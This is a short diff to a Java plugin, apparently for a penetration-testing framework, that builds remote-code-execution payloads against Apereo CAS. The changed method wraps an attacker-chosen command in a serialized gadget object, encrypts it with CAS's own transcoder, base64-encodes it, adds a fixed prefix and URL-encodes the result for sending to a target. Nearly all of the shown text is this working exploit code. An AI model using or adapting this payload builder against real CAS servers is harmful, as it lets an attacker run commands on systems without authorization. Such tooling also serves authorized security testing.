@@ -1,7 +1,10 @@
-package me.gv7.woodpecker.plugin;
+package me.gv7.woodpecker.plugin.utils;
 
+import me.gv7.woodpecker.plugin.CasRCE;
+import me.gv7.woodpecker.plugin.IResultOutput;
 import me.gv7.woodpecker.plugin.payloads.CasPayloadGenerate;
 import me.gv7.woodpecker.requests.Requests;
+import org.apereo.spring.webflow.plugin.EncryptedTranscoder;
 import org.cryptacular.bean.BufferedBlockCipherBean;
 import org.cryptacular.bean.KeyStoreFactoryBean;
 import org.cryptacular.generator.sp80038a.RBGNonce;
@@ -56,9 +59,9 @@ public class CasCommonUtils {
             }catch (javassist.NotFoundException e){
             }
             Object o = ObjectPayload.Utils.makePayloadObject(className, command);
-            //EncryptedTranscoder transcoder = new EncryptedTranscoder();
-            //byte[] aesEncoded = transcoder.encode(o);
-            byte[] aesEncoded = CasCommonUtils.encoder(o);
+            EncryptedTranscoder transcoder = new EncryptedTranscoder();
+            byte[] aesEncoded = transcoder.encode(o);
+            //byte[] aesEncoded = CasCommonUtils.encoder(o);
             String b64Encoded = CodecUtil.b64(aesEncoded);
             String output = "67554b79-6cc1-4d89-a933-e99eb21a0ac2_"+b64Encoded;
             return URLEncoder.encode(output);
